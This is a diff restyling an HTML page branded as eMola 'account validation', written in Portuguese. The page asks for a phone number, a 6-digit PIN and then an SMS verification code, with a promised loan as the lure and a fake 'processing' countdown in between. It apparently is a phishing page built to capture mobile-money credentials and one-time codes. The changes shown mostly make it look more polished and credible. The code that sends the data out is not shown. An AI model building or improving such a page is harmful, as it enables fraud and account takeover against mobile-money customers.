@@ -4,88 +4,159 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>eMola · Validação de conta</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
     :root {
-      --orange-50: #fff6ef;
-      --orange-100: #ffe8d9;
-      --orange-200: #ffd2b3;
-      --orange-300: #ffb37a;
-      --orange-400: #ff8f3c;
+      --orange-50: #fff7f2;
+      --orange-100: #ffe9db;
+      --orange-200: #ffd2b8;
+      --orange-300: #ffb385;
+      --orange-400: #ff9250;
       --orange-500: #f47721;
-      --orange-600: #d95d0b;
-      --orange-700: #b44a08;
-      --ink-900: #1e1b18;
-      --ink-700: #3d3530;
-      --ink-500: #6f6259;
-      --ink-300: #a99e96;
-      --ink-100: #e5ddd6;
+      --orange-600: #e05e0c;
+      --orange-700: #b84907;
+      --ink-900: #1a1613;
+      --ink-700: #3b332e;
+      --ink-500: #6e625b;
+      --ink-400: #8c8078;
+      --ink-300: #b2a8a1;
+      --ink-200: #d6cfc9;
+      --ink-100: #ece6e1;
+      --ink-50: #f7f3f0;
       --white: #ffffff;
-      --shadow-lg: 0 24px 48px -12px rgba(180, 74, 8, 0.25);
-      --radius-lg: 28px;
+      --red-600: #c0392b;
+      --red-50: #fef2f1;
+      --red-200: #f5c2c0;
+      --shadow-xl: 0 32px 64px -16px rgba(184, 73, 7, 0.28), 0 4px 12px -4px rgba(0,0,0,0.06);
+      --shadow-md: 0 8px 24px -6px rgba(0,0,0,0.08);
+      --radius-xl: 32px;
+      --radius-lg: 22px;
+      --radius-md: 16px;
       --radius-sm: 12px;
-      --transition: 0.22s cubic-bezier(0.2, 0, 0, 1);
+      --transition: 0.24s cubic-bezier(0.2, 0, 0, 1);
     }
 
     body {
       min-height: 100vh;
-      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
       color: var(--ink-900);
-      background: linear-gradient(145deg, #fef4ec 0%, #ffeadb 100%);
+      background:
+        radial-gradient(ellipse 80% 60% at 50% -10%, rgba(255, 179, 133, 0.35), transparent 70%),
+        radial-gradient(ellipse 60% 50% at 100% 100%, rgba(255, 146, 80, 0.18), transparent 70%),
+        linear-gradient(160deg, #fef6f0 0%, #ffeadb 100%);
+      background-attachment: fixed;
       display: grid;
       place-items: center;
       padding: 24px;
-      line-height: 1.5;
+      line-height: 1.55;
       -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
     .shell { width: 100%; max-width: 460px; }
 
+    /* ---------- CARD ---------- */
     .card {
       background: var(--white);
-      border-radius: var(--radius-lg);
-      box-shadow: var(--shadow-lg), 0 1px 2px rgba(0,0,0,0.02);
+      border-radius: var(--radius-xl);
+      box-shadow: var(--shadow-xl);
       overflow: hidden;
-      border: 1px solid rgba(255, 255, 255, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.85);
+      position: relative;
+      isolation: isolate;
+    }
+
+    .card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border-radius: var(--radius-xl);
+      padding: 1px;
+      background: linear-gradient(160deg, rgba(255,255,255,0.9), rgba(255, 210, 184, 0.3));
+      -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      pointer-events: none;
     }
 
     /* ---------- BRAND ---------- */
     .brand {
-      padding: 32px 28px 20px;
+      padding: 36px 28px 24px;
       text-align: center;
-      background: linear-gradient(180deg, #fffaf6, #ffffff);
+      background:
+        radial-gradient(ellipse 100% 80% at 50% 0%, rgba(255, 210, 184, 0.45), transparent 70%),
+        linear-gradient(180deg, #fffcf9, #ffffff);
       border-bottom: 1px solid var(--orange-100);
+      position: relative;
     }
 
-    .logo {
+    .logo-wrap {
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      width: 60px;
-      height: 60px;
-      border-radius: 20px;
+      width: 68px;
+      height: 68px;
+      border-radius: 22px;
+      background: linear-gradient(145deg, #ffa65c, #e66a14);
+      box-shadow:
+        0 8px 0 var(--orange-700),
+        0 20px 36px -10px rgba(230, 106, 20, 0.55),
+        inset 0 1px 0 rgba(255,255,255,0.4);
+      margin-bottom: 16px;
+      position: relative;
+      transition: transform var(--transition);
+    }
+
+    .logo-wrap::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      border-radius: 22px;
+      background: linear-gradient(145deg, rgba(255,255,255,0.35), transparent 55%);
+      pointer-events: none;
+    }
+
+    .logo {
       color: white;
       font-weight: 800;
-      font-size: 1.9rem;
-      background: linear-gradient(145deg, #ff9d4d, #e96f16);
-      box-shadow: 0 6px 0 var(--orange-700), 0 16px 28px -8px rgba(233, 111, 22, 0.45);
-      margin-bottom: 14px;
-      letter-spacing: -0.03em;
+      font-size: 2.1rem;
+      letter-spacing: -0.05em;
+      line-height: 1;
+      transform: translateY(-1px);
+      text-shadow: 0 2px 4px rgba(0,0,0,0.15);
     }
 
     .brand h1 {
-      font-size: 2rem;
+      font-size: 2.1rem;
       font-weight: 800;
-      letter-spacing: -0.04em;
+      letter-spacing: -0.045em;
       color: var(--ink-900);
-      margin-bottom: 4px;
+      margin-bottom: 6px;
+      line-height: 1.1;
     }
 
+    .brand h1 span { color: var(--orange-600); }
+
     .subtitle {
-      font-size: 0.93rem;
+      font-size: 0.9rem;
       color: var(--ink-500);
       font-weight: 500;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .subtitle::before {
+      content: "";
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--orange-500);
+      box-shadow: 0 0 0 3px rgba(244, 119, 33, 0.18);
     }
 
     /* ---------- STEP INDICATOR ---------- */
@@ -93,219 +164,370 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
-      padding: 18px 28px 0;
+      gap: 10px;
+      padding: 22px 28px 4px;
     }
 
     .step-dot {
       display: flex;
       align-items: center;
-      gap: 6px;
-      font-size: 0.75rem;
+      gap: 8px;
+      font-size: 0.78rem;
       font-weight: 700;
       color: var(--ink-300);
       transition: color var(--transition);
+      letter-spacing: -0.01em;
     }
 
     .step-dot .dot {
-      width: 26px;
-      height: 26px;
+      width: 30px;
+      height: 30px;
       border-radius: 50%;
-      background: var(--ink-100);
+      background: var(--ink-50);
       color: var(--ink-300);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 0.78rem;
+      font-size: 0.82rem;
       font-weight: 800;
+      border: 1.5px solid var(--ink-100);
       transition: all var(--transition);
+      flex-shrink: 0;
     }
 
-    .step-dot.active {
-      color: var(--orange-600);
-    }
+    .step-dot.active { color: var(--orange-600); }
 
     .step-dot.active .dot {
-      background: linear-gradient(145deg, #ff9d4d, #e96f16);
+      background: linear-gradient(145deg, #ffa65c, #e66a14);
       color: #fff;
-      box-shadow: 0 3px 0 var(--orange-700), 0 6px 12px -4px rgba(233, 111, 22, 0.4);
+      border-color: transparent;
+      box-shadow: 0 4px 0 var(--orange-700), 0 8px 16px -4px rgba(230, 106, 20, 0.5);
+      transform: translateY(-1px);
     }
+
+    .step-dot.done { color: var(--orange-500); }
 
     .step-dot.done .dot {
       background: var(--orange-500);
       color: #fff;
-    }
-
-    .step-dot.done {
-      color: var(--orange-500);
+      border-color: transparent;
     }
 
     .step-line {
-      width: 18px;
-      height: 2px;
+      width: 22px;
+      height: 3px;
       background: var(--ink-100);
-      border-radius: 2px;
+      border-radius: 3px;
       transition: background var(--transition);
+      flex-shrink: 0;
     }
 
-    .step-line.done {
-      background: var(--orange-400);
-    }
+    .step-line.done { background: var(--orange-400); }
 
     /* ---------- CONTENT ---------- */
-    .content { padding: 24px 28px 28px; }
+    .content { padding: 20px 28px 28px; }
 
     .step { display: none; }
     .step.active {
       display: block;
-      animation: fadeUp 0.35s cubic-bezier(0.2, 0, 0, 1);
+      animation: fadeUp 0.4s cubic-bezier(0.2, 0, 0, 1);
     }
 
     @keyframes fadeUp {
-      from { opacity: 0; transform: translateY(8px); }
+      from { opacity: 0; transform: translateY(10px); }
       to   { opacity: 1; transform: translateY(0); }
     }
 
     h2 {
-      font-size: 1.32rem;
-      font-weight: 700;
-      letter-spacing: -0.02em;
+      font-size: 1.4rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
       color: var(--ink-900);
-      margin-bottom: 6px;
+      margin-bottom: 8px;
+      line-height: 1.25;
     }
 
     .hint {
       font-size: 0.9rem;
       color: var(--ink-500);
-      margin-bottom: 20px;
-      line-height: 1.55;
+      margin-bottom: 22px;
+      line-height: 1.6;
+      font-weight: 500;
     }
 
+    /* ---------- NOTICE ---------- */
     .notice {
       border: 1px solid var(--orange-200);
-      background: var(--orange-50);
+      background: linear-gradient(135deg, var(--orange-50), #fffaf6);
       color: var(--orange-700);
-      border-radius: var(--radius-sm);
-      padding: 13px 16px;
+      border-radius: var(--radius-md);
+      padding: 14px 16px;
       font-size: 0.85rem;
-      line-height: 1.5;
+      line-height: 1.55;
       margin-bottom: 22px;
       font-weight: 500;
       display: flex;
-      gap: 8px;
+      gap: 10px;
       align-items: flex-start;
+      position: relative;
     }
 
-    .notice::before {
-      content: "⚠️";
-      font-size: 1rem;
+    .notice .icon {
+      width: 22px;
+      height: 22px;
+      border-radius: 7px;
+      background: linear-gradient(145deg, #ffa65c, #e66a14);
+      color: #fff;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
       flex-shrink: 0;
+      font-size: 0.75rem;
+      font-weight: 800;
+      box-shadow: 0 2px 0 var(--orange-700);
+      margin-top: 1px;
     }
 
-    .notice strong { color: var(--orange-700); font-weight: 700; }
+    .notice strong { color: var(--orange-700); font-weight: 800; }
 
-    /* Notice variant with SMS icon */
-    .notice.sms::before { content: "📩"; }
+    .notice.sms {
+      background: linear-gradient(135deg, #fff6ef, #fffaf6);
+      border-color: var(--orange-300);
+    }
+
+    .notice.sms .icon {
+      background: linear-gradient(145deg, #5ee2a0, #22a06b);
+      box-shadow: 0 2px 0 #158055;
+    }
 
     /* ---------- FORM ---------- */
     label {
-      display: block;
-      font-size: 0.85rem;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.82rem;
       font-weight: 700;
       color: var(--ink-700);
-      margin: 16px 0 8px;
-      letter-spacing: -0.01em;
+      margin: 18px 0 8px;
+      letter-spacing: -0.005em;
+      text-transform: uppercase;
     }
 
     label:first-of-type { margin-top: 0; }
 
+    label svg {
+      width: 14px;
+      height: 14px;
+      stroke: var(--orange-500);
+      stroke-width: 2.4;
+      flex-shrink: 0;
+    }
+
+    .input-wrap { position: relative; }
+
     input {
       width: 100%;
       border: 1.5px solid var(--ink-100);
-      border-radius: var(--radius-sm);
-      padding: 15px 16px;
+      border-radius: var(--radius-md);
+      padding: 16px 18px;
       font: inherit;
       font-size: 1rem;
-      font-weight: 500;
+      font-weight: 600;
       color: var(--ink-900);
       outline: none;
-      background: #fcfaf9;
+      background: var(--ink-50);
       transition: border-color var(--transition), box-shadow var(--transition), background var(--transition);
+      letter-spacing: 0.01em;
     }
 
-    input::placeholder { color: var(--ink-300); font-weight: 400; }
+    input::placeholder {
+      color: var(--ink-300);
+      font-weight: 500;
+      letter-spacing: 0;
+    }
+
     input:hover { border-color: var(--orange-200); }
+
     input:focus {
       border-color: var(--orange-500);
-      box-shadow: 0 0 0 4px rgba(244, 119, 33, 0.12);
+      box-shadow: 0 0 0 4px rgba(244, 119, 33, 0.14);
       background: var(--white);
     }
 
     .error {
       display: none;
-      color: #c0392b;
+      color: var(--red-600);
       font-size: 0.83rem;
       font-weight: 600;
-      margin-top: 10px;
-      padding-left: 2px;
-      line-height: 1.45;
+      margin-top: 12px;
+      padding: 10px 12px;
+      background: var(--red-50);
+      border: 1px solid var(--red-200);
+      border-radius: 10px;
+      line-height: 1.5;
+      align-items: flex-start;
+      gap: 8px;
     }
 
-    /* Prefix hint under phone */
+    .error::before {
+      content: "!";
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      background: var(--red-600);
+      color: #fff;
+      font-size: 0.7rem;
+      font-weight: 800;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .error.show { display: flex; }
+
+    /* Phone hint */
     .phone-hint {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
       font-size: 0.78rem;
       color: var(--ink-500);
-      margin-top: 8px;
-      padding-left: 2px;
+      margin-top: 10px;
+      padding: 9px 12px;
+      background: var(--orange-50);
+      border: 1px dashed var(--orange-200);
+      border-radius: 10px;
       line-height: 1.5;
+      font-weight: 500;
     }
+
+    .phone-hint svg {
+      width: 14px;
+      height: 14px;
+      stroke: var(--orange-600);
+      stroke-width: 2.4;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
     .phone-hint strong {
-      color: var(--orange-600);
+      color: var(--orange-700);
       font-weight: 800;
+      letter-spacing: 0.02em;
     }
 
     /* ---------- BUTTONS ---------- */
     .btn {
       border: none;
       width: 100%;
-      margin-top: 22px;
-      padding: 16px;
-      border-radius: var(--radius-sm);
+      margin-top: 24px;
+      padding: 17px 22px;
+      border-radius: var(--radius-md);
       color: white;
-      background: linear-gradient(135deg, #ff8f3c, #e96f16);
+      background: linear-gradient(135deg, #ffa65c 0%, #f47721 50%, #e05e0c 100%);
       font: inherit;
-      font-weight: 700;
+      font-weight: 800;
       font-size: 1rem;
       letter-spacing: -0.01em;
       cursor: pointer;
-      box-shadow: 0 4px 0 var(--orange-700), 0 12px 24px -8px rgba(233, 111, 22, 0.35);
+      box-shadow:
+        0 5px 0 var(--orange-700),
+        0 16px 28px -8px rgba(224, 94, 12, 0.5),
+        inset 0 1px 0 rgba(255,255,255,0.35);
       transition: transform var(--transition), box-shadow var(--transition), filter var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      position: relative;
+      overflow: hidden;
     }
 
+    .btn::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.28), transparent);
+      transition: left 0.6s ease;
+    }
+
+    .btn:hover:not(:disabled)::before { left: 100%; }
+
     .btn:hover:not(:disabled) {
-      filter: brightness(1.03);
+      filter: brightness(1.04);
       transform: translateY(-1px);
-      box-shadow: 0 5px 0 var(--orange-700), 0 16px 28px -8px rgba(233, 111, 22, 0.4);
+      box-shadow:
+        0 6px 0 var(--orange-700),
+        0 20px 32px -8px rgba(224, 94, 12, 0.55),
+        inset 0 1px 0 rgba(255,255,255,0.35);
     }
 
     .btn:active:not(:disabled) {
       transform: translateY(3px);
-      box-shadow: 0 1px 0 var(--orange-700), 0 8px 16px -4px rgba(233, 111, 22, 0.3);
+      box-shadow:
+        0 2px 0 var(--orange-700),
+        0 10px 18px -6px rgba(224, 94, 12, 0.4),
+        inset 0 1px 0 rgba(255,255,255,0.35);
     }
 
-    .btn:disabled { opacity: 0.65; cursor: not-allowed; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    .btn svg {
+      width: 18px;
+      height: 18px;
+      stroke: currentColor;
+      stroke-width: 2.6;
+      fill: none;
+    }
+
+    .btn .arrow {
+      transition: transform var(--transition);
+    }
+
+    .btn:hover:not(:disabled) .arrow { transform: translateX(3px); }
 
     /* ---------- PROCESSING ---------- */
-    .processing { text-align: center; padding: 8px 0 4px; }
+    .processing { text-align: center; padding: 12px 0 6px; }
+
+    .spinner-wrap {
+      position: relative;
+      width: 76px;
+      height: 76px;
+      margin: 8px auto 24px;
+    }
 
     .spinner {
-      width: 60px;
-      height: 60px;
+      position: absolute;
+      inset: 0;
       border: 4px solid var(--orange-100);
       border-top-color: var(--orange-500);
+      border-right-color: var(--orange-400);
       border-radius: 50%;
       animation: spin 0.9s linear infinite;
-      margin: 16px auto 22px;
+    }
+
+    .spinner-core {
+      position: absolute;
+      inset: 12px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, #fff7f2, #ffe9db);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: inset 0 2px 6px rgba(224,94,12,0.12);
+    }
+
+    .spinner-core svg {
+      width: 22px;
+      height: 22px;
+      stroke: var(--orange-500);
+      stroke-width: 2.6;
+      fill: none;
     }
 
     @keyframes spin { to { transform: rotate(360deg); } }
@@ -323,70 +545,80 @@
       color: var(--orange-600);
       font-weight: 800;
       font-variant-numeric: tabular-nums;
+      font-feature-settings: "tnum";
+      font-size: 1.05em;
     }
 
     .progress {
-      height: 8px;
+      height: 10px;
       background: var(--orange-100);
       border-radius: 99px;
       overflow: hidden;
-      margin: 22px 0 10px;
+      margin: 24px 0 12px;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.06);
     }
 
     .progress span {
       display: block;
       width: 0%;
       height: 100%;
-      background: linear-gradient(90deg, var(--orange-400), var(--orange-500));
+      background: linear-gradient(90deg, var(--orange-400), var(--orange-500) 60%, var(--orange-600));
       border-radius: 99px;
-      transition: width 0.25s linear;
+      transition: width 0.3s linear;
+      box-shadow: 0 0 12px rgba(244,119,33,0.4);
     }
 
     /* ---------- OTP ---------- */
     .otp-row {
       display: flex;
       gap: 10px;
-      margin-top: 12px;
+      margin-top: 14px;
       justify-content: center;
     }
 
     .otp-row input {
       text-align: center;
-      font-size: 1.5rem;
-      font-weight: 700;
-      padding: 14px 0;
-      border-radius: var(--radius-sm);
-      background: #fcfaf9;
+      font-size: 1.55rem;
+      font-weight: 800;
+      padding: 16px 0;
+      border-radius: var(--radius-md);
+      background: var(--ink-50);
       border: 1.5px solid var(--ink-100);
-      transition: border-color var(--transition), box-shadow var(--transition), background var(--transition);
+      transition: border-color var(--transition), box-shadow var(--transition), background var(--transition), transform var(--transition);
       width: 100%;
       min-width: 0;
+      color: var(--ink-900);
+      caret-color: var(--orange-500);
     }
 
     .otp-row input:focus {
       border-color: var(--orange-500);
-      box-shadow: 0 0 0 4px rgba(244, 119, 33, 0.12);
+      box-shadow: 0 0 0 4px rgba(244, 119, 33, 0.14), 0 4px 12px -4px rgba(244,119,33,0.3);
       background: var(--white);
+      transform: translateY(-2px);
     }
 
     .otp-row input.filled {
-      border-color: var(--orange-300);
+      border-color: var(--orange-400);
       background: var(--white);
+      color: var(--orange-700);
     }
 
     /* OTP validity badge */
     .otp-validity {
-      display: inline-flex;
+      display: flex;
       align-items: center;
-      gap: 6px;
-      margin-top: 10px;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 16px;
       font-size: 0.82rem;
       font-weight: 700;
       color: var(--orange-700);
-      background: var(--orange-50);
+      background: linear-gradient(135deg, var(--orange-50), #fffaf6);
       border: 1px solid var(--orange-200);
       border-radius: 99px;
-      padding: 6px 12px;
+      padding: 8px 16px;
+      letter-spacing: -0.005em;
     }
 
     .otp-validity .pulse {
@@ -395,22 +627,24 @@
       border-radius: 50%;
       background: var(--orange-500);
       animation: pulse 1.4s ease-in-out infinite;
+      flex-shrink: 0;
+      box-shadow: 0 0 0 0 rgba(244,119,33,0.5);
     }
 
     @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(1.3); }
+      0%, 100% { opacity: 1; transform: scale(1); box-shadow: 0 0 0 0 rgba(244,119,33,0.5); }
+      50% { opacity: 0.7; transform: scale(1.25); box-shadow: 0 0 0 4px rgba(244,119,33,0); }
     }
 
     /* ---------- FINAL ERROR ---------- */
     .final-error {
-      border: 1px solid #f5c2c0;
-      background: #fff8f8;
-      color: #b42318;
-      border-radius: var(--radius-sm);
-      padding: 20px;
+      border: 1.5px solid var(--red-200);
+      background: linear-gradient(135deg, #fff8f8, #fef2f1);
+      color: var(--red-600);
+      border-radius: var(--radius-md);
+      padding: 22px;
       font-size: 0.95rem;
-      font-weight: 600;
+      font-weight: 700;
       text-align: center;
       margin-top: 22px;
       line-height: 1.55;
@@ -418,71 +652,136 @@
 
     .final-error .sms-note {
       display: flex;
-      gap: 8px;
+      gap: 10px;
       align-items: flex-start;
       text-align: left;
-      margin-top: 14px;
-      padding: 12px 14px;
-      background: #fff;
+      margin-top: 16px;
+      padding: 14px 16px;
+      background: var(--white);
       border: 1px solid var(--orange-200);
       border-radius: var(--radius-sm);
-      font-size: 0.86rem;
+      font-size: 0.85rem;
       font-weight: 500;
       color: var(--orange-700);
+      line-height: 1.55;
     }
 
-    .final-error .sms-note::before {
-      content: "📩";
-      font-size: 1rem;
+    .final-error .sms-note .icon {
+      width: 22px;
+      height: 22px;
+      border-radius: 7px;
+      background: linear-gradient(145deg, #5ee2a0, #22a06b);
+      color: #fff;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
       flex-shrink: 0;
+      font-size: 0.75rem;
+      font-weight: 800;
+      box-shadow: 0 2px 0 #158055;
+      margin-top: 1px;
     }
+
+    .final-error .sms-note strong { color: var(--orange-700); font-weight: 800; }
 
     .final-error .btn {
       margin-top: 18px;
-      background: linear-gradient(135deg, #ff8f3c, #e96f16);
-      box-shadow: 0 4px 0 var(--orange-700);
+      background: linear-gradient(135deg, #ffa65c 0%, #f47721 50%, #e05e0c 100%);
+      box-shadow: 0 5px 0 var(--orange-700), 0 16px 28px -8px rgba(224, 94, 12, 0.5);
     }
 
     /* ---------- FOOTER ---------- */
-    .footer { padding: 0 28px 24px; text-align: center; }
+    .footer { padding: 0 28px 26px; text-align: center; }
 
     .small-link {
-      color: var(--orange-600);
+      color: var(--ink-400);
       text-decoration: none;
       font-weight: 700;
-      font-size: 0.85rem;
-      opacity: 0.8;
+      font-size: 0.83rem;
       transition: color var(--transition), opacity var(--transition);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
     }
 
-    .small-link:hover { color: var(--orange-700); opacity: 1; }
+    .small-link svg {
+      width: 14px;
+      height: 14px;
+      stroke: currentColor;
+      stroke-width: 2.4;
+      fill: none;
+    }
+
+    .small-link:hover { color: var(--orange-600); }
 
     /* ---------- RESPONSIVE ---------- */
-    @media (max-width: 420px) {
+    @media (max-width: 480px) {
       body { padding: 16px; }
-      .brand { padding: 26px 20px 18px; }
-      .content { padding: 22px 20px 24px; }
-      .footer { padding: 0 20px 20px; }
-      .steps { padding: 16px 20px 0; }
+
+      .brand { padding: 30px 22px 20px; }
+      .brand h1 { font-size: 1.9rem; }
+      .logo-wrap { width: 60px; height: 60px; border-radius: 20px; }
+      .logo { font-size: 1.9rem; }
+
+      .steps { padding: 18px 22px 2px; gap: 8px; }
+      .step-line { width: 16px; }
+      .step-dot .dot { width: 28px; height: 28px; font-size: 0.78rem; }
+
+      .content { padding: 18px 22px 24px; }
+      .footer { padding: 0 22px 22px; }
+
       .otp-row { gap: 7px; }
-      .otp-row input { font-size: 1.3rem; padding: 12px 0; }
-      h2 { font-size: 1.22rem; }
-      .logo { width: 54px; height: 54px; font-size: 1.7rem; border-radius: 18px; }
-      .brand h1 { font-size: 1.85rem; }
-      .step-dot span.label { display: none; }
+      .otp-row input { font-size: 1.35rem; padding: 14px 0; }
+
+      h2 { font-size: 1.28rem; }
+      .hint { font-size: 0.87rem; margin-bottom: 20px; }
+
+      .btn { padding: 16px 20px; font-size: 0.97rem; }
+
+      .processing .spinner-wrap { width: 68px; height: 68px; }
     }
 
-    @media (max-width: 360px) {
+    @media (max-width: 380px) {
+      body { padding: 12px; }
+
+      .brand { padding: 26px 18px 18px; }
+      .brand h1 { font-size: 1.75rem; }
+      .logo-wrap { width: 54px; height: 54px; border-radius: 18px; }
+      .logo { font-size: 1.7rem; }
+
+      .steps { padding: 16px 18px 2px; gap: 6px; }
+      .step-dot .label { display: none; }
+      .step-line { width: 24px; }
+
+      .content { padding: 16px 18px 22px; }
+      .footer { padding: 0 18px 20px; }
+
       .otp-row { gap: 5px; }
-      .otp-row input { font-size: 1.15rem; padding: 10px 0; border-radius: 10px; }
-      .step-line { width: 12px; }
+      .otp-row input {
+        font-size: 1.2rem;
+        padding: 12px 0;
+        border-radius: 11px;
+      }
+
+      .notice { font-size: 0.82rem; padding: 12px 14px; }
+      h2 { font-size: 1.2rem; }
+      .hint { font-size: 0.85rem; }
     }
 
+    /* ---------- FOCUS ---------- */
     .btn:focus-visible,
     input:focus-visible,
     .small-link:focus-visible {
       outline: 2px solid var(--orange-500);
       outline-offset: 3px;
+    }
+
+    /* Reduced motion */
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        transition-duration: 0.01ms !important;
+      }
     }
   </style>
 </head>
@@ -490,8 +789,10 @@
   <main class="shell">
     <section class="card">
       <header class="brand">
-        <div class="logo" aria-hidden="true">e</div>
-        <h1>eMola</h1>
+        <div class="logo-wrap" aria-hidden="true">
+          <span class="logo">e</span>
+        </div>
+        <h1>e<span>Mola</span></h1>
         <p class="subtitle">Validação de conta</p>
       </header>
 
@@ -515,31 +816,66 @@
 
       <div class="content">
         <div class="notice">
-          <strong>Atenção:</strong> escreva os seus dados corretos para não correr o risco do seu empréstimo não ser aprovado.
+          <span class="icon">!</span>
+          <span><strong>Atenção:</strong> escreva os seus dados corretos para não correr o risco do seu empréstimo não ser aprovado.</span>
         </div>
 
         <!-- STEP 1: LOGIN -->
-        <form id="loginForm" class="step active">
-          <h2>Entrar</h2>
-          <p class="hint">Introduza o seu número de telefone e PIN.</p>
+        <form id="loginForm" class="step active" novalidate>
+          <h2>Bem-vindo de volta</h2>
+          <p class="hint">Introduza o seu número de telefone e PIN para continuar.</p>
 
-          <label for="phone">Número de telefone</label>
-          <input id="phone" type="tel" inputmode="numeric" autocomplete="off"
-                 placeholder="9 dígitos" maxlength="9" required>
-          <p class="phone-hint">Aceitamos números <strong>eMola</strong> que começam por <strong>86</strong>, <strong>87</strong> ou <strong>88</strong>.</p>
+          <label for="phone">
+            <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+            </svg>
+            Número de telefone
+          </label>
+          <div class="input-wrap">
+            <input id="phone" type="tel" inputmode="numeric" autocomplete="off"
+                   placeholder="9 dígitos" maxlength="9" required>
+          </div>
+          <div class="phone-hint">
+            <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"/>
+              <path d="M12 16v-4M12 8h.01"/>
+            </svg>
+            <span>Aceitamos números <strong>eMola</strong> que começam por <strong>86</strong>, <strong>87</strong> ou <strong>88</strong>.</span>
+          </div>
 
-          <label for="pin">PIN (6 dígitos)</label>
-          <input id="pin" type="password" inputmode="numeric" autocomplete="off"
-                 placeholder="PIN de 6 dígitos" maxlength="6" required>
+          <label for="pin">
+            <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="11" width="18" height="11" rx="2"/>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            </svg>
+            PIN (6 dígitos)
+          </label>
+          <div class="input-wrap">
+            <input id="pin" type="password" inputmode="numeric" autocomplete="off"
+                   placeholder="PIN de 6 dígitos" maxlength="6" required>
+          </div>
 
           <p class="error" id="loginError">Preencha corretamente o telefone (9 dígitos) e o PIN (6 dígitos).</p>
-          <button class="btn" type="submit">Entrar</button>
+
+          <button class="btn" type="submit">
+            Entrar
+            <svg class="arrow" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12h14M12 5l7 7-7 7"/>
+            </svg>
+          </button>
         </form>
 
         <!-- STEP 2: PROCESSING -->
         <section id="processingStep" class="step">
           <div class="processing">
-            <div class="spinner"></div>
+            <div class="spinner-wrap">
+              <div class="spinner"></div>
+              <div class="spinner-core">
+                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
+                </svg>
+              </div>
+            </div>
             <h2>A processar…</h2>
             <p class="status">Aguarde <span class="timer" id="countdown">10</span> segundos.</p>
             <div class="progress"><span id="progressBar"></span></div>
@@ -548,13 +884,21 @@
         </section>
 
         <!-- STEP 3: OTP -->
-        <form id="otpForm" class="step">
+        <form id="otpForm" class="step" novalidate>
           <h2>Código de verificação</h2>
           <div class="notice sms">
-            O sistema eMola irá enviar um <strong>código via SMS</strong> para o seu telefone. Introduza o código corretamente.
+            <span class="icon">✉</span>
+            <span>O sistema eMola irá enviar um <strong>código via SMS</strong> para o seu telefone. Introduza o código corretamente.</span>
           </div>
           <p class="hint">Introduza o código de 6 dígitos enviado por SMS para o seu telefone. O envio é automático ao preencher o último dígito.</p>
-          <label for="otp">Código de 6 dígitos</label>
+
+          <label for="otp">
+            <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="5" width="18" height="14" rx="2"/>
+              <path d="m3 7 9 6 9-6"/>
+            </svg>
